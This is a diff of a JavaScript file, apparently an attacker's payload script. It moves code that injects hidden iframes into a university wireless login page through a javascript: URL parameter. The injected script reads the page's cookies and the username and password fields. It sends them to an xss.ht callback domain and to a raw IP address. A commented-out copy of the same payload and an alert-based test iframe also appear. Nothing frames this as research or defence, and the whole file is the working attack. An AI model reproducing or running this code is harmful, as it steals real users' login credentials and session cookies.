@@ -44,15 +44,7 @@
 // }
 
 
-var ele = document.createElement('IFRAME')
-ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
-ele.style = "display: none"
-document.children[0].appendChild(ele)
 
-var ele2 = document.createElement('IFRAME')
-ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'http://166.111.68.92/save?'+cdt+'%26'+uname+'%26'+pass, true), xmlHttp.send(null))"
-ele2.style = "display: none"
-document.children[0].appendChild(ele2)
 
 // <iframe src="http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass})))" style="display: none"/>
 
@@ -64,3 +56,13 @@ ele3.id = "test3"
 ele3.style = "display: none"
 document.children[0].appendChild(ele3)
 setTimeout(()=>{alert(document.getElementById('test3').contentDocument.body.children[1].children[0].children[0].children[1].children[1].children[0].children[0].children[0].children[0].children[0].children[0].children[0].children[0].value)}, 1000)
+
+var ele = document.createElement('IFRAME')
+ele.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass+' '+cdt})))"
+ele.style = "display: none"
+document.children[0].appendChild(ele)
+
+var ele2 = document.createElement('IFRAME')
+ele2.src = "http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'http://166.111.68.92/save?'+cdt+'%26'+uname+'%26'+pass, true), xmlHttp.send(null))"
+ele2.style = "display: none"
+document.children[0].appendChild(ele2)
